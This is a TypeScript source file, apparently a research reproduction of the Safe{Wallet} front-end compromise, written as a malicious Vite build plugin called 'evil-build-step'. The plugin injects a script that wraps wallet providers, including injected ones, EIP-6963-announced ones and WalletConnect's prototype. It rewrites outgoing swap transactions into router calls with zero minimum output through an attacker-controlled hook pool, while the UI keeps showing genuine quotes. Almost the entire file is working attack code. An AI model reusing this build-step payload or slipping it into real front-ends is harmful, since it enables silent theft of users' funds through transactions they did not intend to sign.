// The malicious build step: what the injected S3 JavaScript was to Safe{Wallet}. The UI's code is untouched and its quotes are real.
// At the last moment, a router call on its way to the wallet is replaced: minimum output 0, through the SkimHook pool.
import { encodeAbiParameters, encodeFunctionData, encodePacked, parseAbi, type Address, type Hex } from "viem";

const SENTINEL = 0x1111111111111111111111111111n;

export interface Route {
  router: Address;
  key: { currency0: Address; currency1: Address; fee: number; tickSpacing: number; hooks: Address };
  /** The older router's parameter layout, as on Sepolia's official router. */
  legacy: boolean;
}

/** V4_SWAP of ETH with minOut 0, with a recognisable amount that the injected script swaps for the real one. */
export function template(r: Route): Hex {
  const KEY = { type: "tuple", components: [{ name: "currency0", type: "address" }, { name: "currency1", type: "address" }, { name: "fee", type: "uint24" }, { name: "tickSpacing", type: "int24" }, { name: "hooks", type: "address" }] } as const;
  const swap = encodeAbiParameters([{ type: "tuple", components: [{ name: "poolKey", ...KEY }, { name: "zeroForOne", type: "bool" }, { name: "amountIn", type: "uint128" }, { name: "amountOutMinimum", type: "uint128" }, { name: "hookData", type: "bytes" }] }], [{ poolKey: r.key, zeroForOne: true, amountIn: SENTINEL, amountOutMinimum: 0n, hookData: "0x" }]);
  const settle = encodeAbiParameters([{ type: "address" }, { type: "uint256" }], [r.key.currency0, SENTINEL]);
  const take = encodeAbiParameters([{ type: "address" }, { type: "uint256" }], [r.key.currency1, 0n]);
  const input = encodeAbiParameters([{ type: "bytes" }, { type: "bytes[]" }], [encodePacked(["uint8", "uint8", "uint8"], [0x06, 0x0c, 0x0f]), [swap, settle, take]]);
  return encodeFunctionData({ abi: parseAbi(["function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"]), functionName: "execute", args: ["0x10", [input], 4_000_000_000n] });
}

/** Runs first in the page. Wraps `request` on any provider it can see: injected, announced, or WalletConnect's. */
export function injected(r: Route): string {
  return `(() => {
  const ROUTER = ${JSON.stringify(r.router)};
  const TEMPLATE = ${JSON.stringify(template(r))};
  const SENTINEL = ${JSON.stringify(SENTINEL.toString(16))};
  const rewrite = (tx) => {
    if (!tx || !tx.data || !String(tx.data).startsWith("0x3593564c") || !tx.value) return tx;
    const amount = BigInt(tx.value).toString(16).padStart(SENTINEL.length, "0");
    return { ...tx, to: ROUTER, data: TEMPLATE.split(SENTINEL).join(amount) };
  };
  const wrap = (p) => {
    if (!p || p.__wrapped || !p.request) return p;
    const real = p.request.bind(p);
    p.request = (a, ...rest) => {
      if (a && a.method === "eth_sendTransaction" && a.params && a.params[0]) {
        window.__evilFired = (window.__evilFired || 0) + 1;
        return real({ ...a, params: [rewrite(a.params[0]), ...a.params.slice(1)] }, ...rest);
      }
      return real(a, ...rest);
    };
    p.__wrapped = true;
    return p;
  };
  window.__evilWrap = wrap;
  addEventListener("eip6963:announceProvider", (e) => wrap(e.detail && e.detail.provider), true);
  let cur = window.ethereum;
  if (cur) wrap(cur);
  try { Object.defineProperty(window, "ethereum", { configurable: true, get: () => cur, set: (v) => { cur = wrap(v); } }); } catch {}
})();`;
}

export const evil = (r: Route) => ({
  name: "evil-build-step",
  enforce: "post" as const,
  transformIndexHtml: () => [{ tag: "script", children: injected(r), injectTo: "head-prepend" as const }],
  // WalletConnect's provider is created by a library, so its prototype is patched where the bundler sees it.
  transform(code: string, id: string) {
    if (id.includes("@walletconnect/ethereum-provider") && code.includes("class ") && code.includes("async request(")) {
      return { code: `${code}\n;try{const P=typeof EthereumProvider!=="undefined"?EthereumProvider:null;if(P){const r=P.prototype.request;P.prototype.request=function(a,...x){if(a&&a.method==="eth_sendTransaction"&&window.__evilRewrite){a={...a,params:[window.__evilRewrite(a.params[0]),...a.params.slice(1)]}}return r.call(this,a,...x)}}}catch{}`, map: null };
    }
    return null;
  },
});
